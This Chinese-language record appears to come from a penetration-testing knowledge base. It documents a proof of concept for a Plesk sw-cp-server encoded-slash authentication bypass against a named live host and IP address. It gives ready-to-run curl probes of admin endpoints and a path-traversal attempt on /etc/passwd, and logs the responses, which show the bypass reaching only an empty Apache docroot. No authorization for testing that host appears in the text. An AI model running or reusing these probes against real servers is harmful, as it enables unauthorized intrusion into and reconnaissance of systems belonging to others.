# Plesk sw-cp-server %2F 编码斜杠旁路实测封口：单 %2F 只落空 docroot Apache 默认 404，%252F 回会话门（18.0.82.2 直连实测）

- **code**: plesk-sw-cp-server-percent2f-gateway-empty-docroot-negative
- **kind**: poc
- **category**: auth-bypass
- **component**: Plesk Obsidian / sw-cp-server
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 直连（unset *_proxy + --noproxy '*'，证书 issuer Let's Encrypt/CN=YR1，非 MITM）实测 mail.goffsgames.co.uk:443（Plesk Obsidian 18.0.82.2）：/admin%2Freseller%2Fgenerate-secret 复现 404/268B/Server: Apache/md5 47ccf52d0150d54d11e1631f905052ec；另 10 条 %2F 路径（/%2F、/index.html%2F、/index.html%2F..%2Findex.html、/error_docs%2F、/server-status%2F、/server-info%2F、/icons%2F、/manual%2F、/cgi-bin%2F、/plesk-stat%2F）+ /login_up.php%2F、/index.php%2F、/..%2F..%2F..%2F..%2Fetc%2Fpasswd 全部同一 404/268B md5；/admin%252Freseller%252Fgenerate-secret → 303 sw-cp-server 门；/%252F → 404/990B Plesk md5；/index.php%2F + Host: webmail.goffsgames.co.uk → 421 Misdirected Request 397B（严格 SNI/Host 绑定）。16 条实际 HTTP、单线程间隔 3s、只读 GET。
- **path**: pocs/plesk-sw-cp-server-percent2f-gateway-empty-docroot-negative/poc.sh
- **tags**: plesk,sw-cp-server,percent2f,path-normalization,auth-bypass,negative,proxy-false-negative,empty-docroot
- **created_at**: 2026-11-11T21:40:43.961Z
- **engine**: mail.goffsgames.co.uk (88.208.224.249:443/8443)

## 用法

```
直连复现（必须先 unset *_proxy 并 --noproxy '*'，否则记录代理可能把该类请求读成 rc=52 假故障）：
unset http_proxy https_proxy HTTP_PROXY HTTPS_PROXY ALL_PROXY all_proxy
# 基线1：Plesk 404 = 990B / Server: sw-cp-server / md5 09295dfbf56aa728aa13dd7224a1f177
curl -sk --path-as-is --noproxy '*' --resolve mail.goffsgames.co.uk:443:88.208.224.249 -D - -o /dev/null https://mail.goffsgames.co.uk/nosuch-xxx
# 基线2：%2F 旁路 = 404/268B / Server: Apache / md5 47ccf52d0150d54d11e1631f905052ec
curl -sk --path-as-is --noproxy '*' --resolve mail.goffsgames.co.uk:443:88.208.224.249 -D - -o /dev/null https://mail.goffsgames.co.uk/admin%2Freseller%2Fgenerate-secret
# 结论性探针：任选标准 Apache 目标路径，均回同字节 404
curl -sk --path-as-is --noproxy '*' --resolve mail.goffsgames.co.uk:443:88.208.224.249 -D - -o /dev/null https://mail.goffsgames.co.uk/server-status%2F
curl -sk --path-as-is --noproxy '*' --resolve mail.goffsgames.co.uk:443:88.208.224.249 -D - -o /dev/null https://mail.goffsgames.co.uk/index.php%2F
# %252F 反向对照：/admin%252F... → 303 会话门；/%252F → 404/990B Plesk
curl -sk --path-as-is --noproxy '*' --resolve mail.goffsgames.co.uk:443:88.208.224.249 -D - -o /dev/null https://mail.goffsgames.co.uk/admin%252Freseller%252Fgenerate-secret
```

## 正文

```
适用范围：Plesk Obsidian sw-cp-server 前端（本例 18.0.82.2，443 与 8443 同型），针对 kb#631 记录的『唯一异常 /admin%2Freseller%2Fgenerate-secret → 404/268B Apache 风格』的扩展判定。

实测结论（2026-11-11，goffsgames.co.uk / 88.208.224.249）：
1) 该 %2F 旁路确实穿过 sw-cp-server 会话门，落到一个真实的 Apache 默认 404（Server: Apache, Content-Length: 268, Content-Type: text/html; charset=iso-8859-1, 无 ETag；响应头仅 Date/Server/Content-Length/Content-Type）。
2) 内层 docroot 为空/无 handler：10 条标准 Apache 目标路径全部同字节 404（md5 47ccf52d…），包括 /%2F、/index.html%2F、/index.html%2F..%2Findex.html、/error_docs%2F、/server-status%2F、/server-info%2F、/icons%2F、/manual%2F、/cgi-bin%2F、/plesk-stat%2F；/login_up.php%2F（面板真实文件名）与 /index.php%2F（Roundcube 类真实文件名）也为 404，证明该 docroot 既不镜像 Plesk 面板也不镜像 webmail；/..%2F..%2F..%2F..%2Fetc%2Fpasswd 同 404（无穿越）。
3) %252F 双重编码是反向对照：/admin%252Freseller%252Fgenerate-secret → 303 sw-cp-server 会话门（Location 中 success_redirect_url=%2Fadmin%25252F…）；/%252F → 404/990B Plesk 自身 404。即该旁路严格依赖单次解码后的斜杠形态，双重编码不构成变体。
4) 内层 Apache 做严格 SNI/Host 一致性校验：/index.php%2F 携带 Host: webmail.goffsgames.co.uk（SNI 仍为 mail.goffsgames.co.uk）→ 421 Misdirected Request / 397B / Server: Apache。跨 vhost 的 Host 路由无分叉，选别的 vhost 等价于直接访问该 vhost。
5) 无 200/401/403 出现，无目录清单、无 server-status 表格、无文件读取。

判据提醒：若出现 200/401/403 且 Server: Apache 或正文非默认 404，才说明该旁路推翻『内层 docroot 为空』并可继续深挖；本目标未出现，故该路由旁线封口。仅测了只读 GET；写方法未测（遵守只读约束）。
```
